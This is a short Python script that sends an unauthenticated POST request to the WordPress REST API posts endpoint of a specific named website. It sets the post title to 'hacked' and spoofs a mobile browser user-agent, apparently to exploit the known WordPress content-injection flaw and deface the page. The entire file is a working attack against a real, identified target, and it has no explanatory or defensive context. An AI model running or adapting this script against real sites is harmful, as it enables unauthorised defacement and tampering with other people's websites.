import requests
import urllib

url = 'http://technicalsagar.in/wp-json/wp/v2/posts/181?id=181'

params = {'Name':'Hacked', 'title':'hacked'}

headers = {'User-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1'}

url_parms = urllib.urlencode(params)

data = requests.request('POST', url, data=params, headers=headers)

response = data.status_code
print response
print data.text
